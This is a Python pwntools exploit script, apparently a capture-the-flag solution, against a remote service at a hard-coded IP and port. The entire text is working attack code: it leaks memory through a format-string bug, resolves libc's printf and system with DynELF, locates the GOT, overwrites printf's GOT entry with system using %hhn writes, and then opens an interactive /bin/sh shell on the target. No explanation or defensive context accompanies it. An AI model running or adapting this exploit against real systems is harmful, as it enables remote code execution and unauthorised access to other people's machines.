from pwn import *

conn = remote('78.46.224.86', 1337)

context.update(arch='amd64', os='linux')

def exec_payload(payload):
    if '\n' in payload:
        return ""
    conn.sendline("P0WN" + payload)
    conn.recvuntil("P0WN")
    data = conn.recvrepeat(0.5)
    log.info("%s => %s" % (repr(payload), repr(data)))
    return data

def print_stack(until):
    for i in xrange(1, until + 1):
        exec_payload('%' + str(i) + '$p')

addr_into_bin = int(exec_payload('%30$p'), 16)
log.info('Using address %s' % hex(addr_into_bin))

def find_leak_point():
    for i in xrange(1, 200):
        r = exec_payload('%' + str(i) + '$p' + 'XXXXXXXX' + 'YYYYYYYY')
        if '0x5959595959595959' in r:
            return i

leak_point = find_leak_point()
log.info('Found leak point %d' % leak_point)

def leak(addr):
    addr &= (2**64 - 1)
    log.info('Leaking address %s' % hex(addr))
    r = exec_payload('%' + str(leak_point) + '$s' + 'XXXXXXXX' + p64(addr))
    if r == '':
        return ''
    r = r[:r.index('XXXXXXXX')]
    if r == '(null)':
        return '\x00'
    else:
        return r + '\x00'

d = DynELF(leak, addr_into_bin)

dynamic_addr = d.dynamic

printf_addr = d.lookup('printf', 'libc')
system_addr = d.lookup('system', 'libc')

def find_plt_got():
    addr = dynamic_addr
    while True:
        x = d.leak.n(addr, 2)
        if x == '\x03\x00': # type PLTGOT
            addr += 8
            return u64(d.leak.n(addr, 8))
        addr += 0x10

got_addr = find_plt_got()
log.info('GOT Address: %s' % hex(got_addr))

def find_printf():
    addr = got_addr
    while True:
        x = d.leak.n(addr, 8)
        if x == p64(printf_addr):
            return addr
        addr += 8

printf_got = find_printf()
log.info('printf@got : %s' % hex(printf_got))

def fmt_gen(addr, val):
    ret = ''
    curout = 4
    dist_to_addr = 12 + 8*20
    reader = (dist_to_addr / 8) + 7
    for i in range(8):
        diff = (val & 0xff) - curout
        curout = (val & 0xff)
        val /= 0x100
        if diff < 20:
            diff += 0x100
        ret += '%0' + str(diff) + 'u'
        ret += '%' + str(reader) + '$hhn'
        reader += 1
    assert(len(ret) < dist_to_addr)
    ret += 'A'*(dist_to_addr - len(ret))
    for i in range(8):
        ret += p64(addr + i)
    return ret

log.info("Running exploit")
exec_payload(fmt_gen(printf_got, system_addr))
conn.sendline('/bin/sh')
log.info("Opened shell")
conn.interactive()

conn.close()
